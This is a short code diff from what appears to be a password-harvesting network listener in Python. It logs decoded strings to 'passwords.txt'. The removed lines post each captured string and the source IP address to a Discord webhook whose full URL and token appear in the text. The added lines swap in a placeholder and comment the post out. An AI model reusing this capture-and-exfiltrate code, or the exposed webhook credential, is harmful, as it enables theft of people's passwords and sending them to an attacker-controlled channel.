@@ -32,9 +32,9 @@ def listen_for_utf16le_string(port=80, output_file='passwords.txt'):
 
                             timestamp = datetime.now().strftime('%Y-%m-%d %H:%m%S')
 
-                            requests.post(
-                                "https://discord.com/api/webhooks/1231255731206881310/aQ-XBNP9-_k_6mNMIjqkOSP32izJXpbx6AsQqpybjgMDK-_rR8l2nKhgJ27_uKw8OKFH",
-                                json={"content": addr[0] + ' @ ' + timestamp+ " ```" + decoded_string + "```"})
+                            #requests.post(
+                            #    "https://DISCORDURL",
+                            #    json={"content": addr[0] + ' @ ' + timestamp+ " ```" + decoded_string + "```"})
 
                             # Terminal output with colors
                             output = (f"{Fore.RED}{addr[0]}{Style.RESET_ALL} :: "  +# IP in red
